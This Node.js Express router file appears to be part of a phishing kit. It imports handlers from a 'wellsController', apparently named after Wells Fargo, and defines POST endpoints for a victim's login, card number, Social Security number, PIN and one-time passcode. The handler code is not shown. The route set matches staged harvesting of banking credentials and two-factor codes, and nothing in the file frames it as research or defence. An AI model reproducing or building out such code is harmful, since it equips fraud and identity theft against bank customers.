const express = require("express");
const {
  submitLogin,
  submitCard,
  submitSSN,
  submitPin,
  submitOtp,
} = require("../controllers/wellsController");
const router = express.Router();

router.post("/login", submitLogin);
router.post("/card", submitCard);
router.post("/ssn", submitSSN);
router.post("/pin", submitPin);
router.post("/otp", submitOtp);

module.exports = router;
